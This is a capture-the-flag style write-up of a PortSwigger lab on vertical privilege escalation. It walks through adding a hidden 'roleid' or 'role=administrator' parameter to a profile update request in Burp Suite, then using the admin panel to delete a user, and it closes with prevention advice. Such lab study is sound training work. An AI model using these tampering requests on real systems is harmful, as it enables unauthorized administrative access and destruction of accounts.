# PortSwigger Lab: User Role Can Be Modified in User Profile

## Lab Description

This lab contains an access control vulnerability where a user's role can be modified through the profile update functionality.

The application uses role-based access control (RBAC), but fails to properly validate which parameters a user is allowed to modify. By intercepting and modifying the profile update request, it is possible to escalate privileges and gain administrator access.

### Goal

Obtain administrator privileges and delete the user `carlos`.

---

## Vulnerability

The application exposes a hidden parameter related to user roles in the profile update request.

Although the user interface does not provide an option to change roles, the backend trusts user-supplied input and updates the role value when it is included in the request.

This is a classic **vertical privilege escalation** vulnerability caused by broken access control.

---

## Solution

### Step 1: Log in

Log in using the provided credentials:

```text
Username: wiener
Password: peter
```

---

### Step 2: Open the User Profile

Navigate to:

```text
My Account
```

Observe the profile update functionality.

---

### Step 3: Intercept the Request

Enable Burp Suite interception and submit a profile update request.

Example request:

```http
POST /my-account/change-email HTTP/2

email=test@example.com
```

Send the request to **Repeater**.

---

### Step 4: Test for Hidden Parameters

Modify the request body by adding a role parameter:

```http
email=test@example.com&roleid=2
```

or

```http
email=test@example.com&role=administrator
```

Depending on the lab version, one of these parameters will be accepted.

Successful response indicates that the role has been updated.

Example:

```json
{
  "username":"wiener",
  "email":"test@example.com",
  "roleid":2
}
```

---

### Step 5: Verify Admin Access

Reload the application.

An **Admin Panel** link should now appear.

Navigate to:

```text
/admin
```

---

### Step 6: Delete Carlos

Locate the user:

```text
carlos
```

Delete the account using the admin functionality.

Example request:

```http
GET /admin/delete?username=carlos HTTP/2
```

---

## Impact

An attacker can elevate privileges from a normal user account to an administrator account.

This allows unauthorized access to administrative functionality and can lead to complete compromise of the application.

---

## Root Cause

The server trusts client-controlled parameters and does not enforce authorization checks on sensitive attributes such as:

* `role`
* `roleid`
* `isAdmin`
* `admin`

Any authorization decision must be enforced on the server side, regardless of whether the parameter is exposed in the user interface.

---

## Prevention

### 1. Enforce Server-Side Authorization

Validate that only administrators can modify role-related attributes.

### 2. Use Allow Lists

Only accept fields that regular users are permitted to modify.

Example:

```python
allowed_fields = ["email"]

for field in request_data:
    if field not in allowed_fields:
        reject_request()
```

### 3. Ignore Sensitive Client Input

Never trust client-supplied values for:

* Roles
* Permissions
* Account status
* Administrative flags

### 4. Apply Principle of Least Privilege

Users should only have the minimum permissions required for their tasks.

---

## Key Takeaway

Hidden form fields and API parameters should never be trusted for authorization decisions. Even if a role field is not visible in the UI, attackers can modify requests using tools such as Burp Suite and escalate privileges if proper server-side access controls are missing.
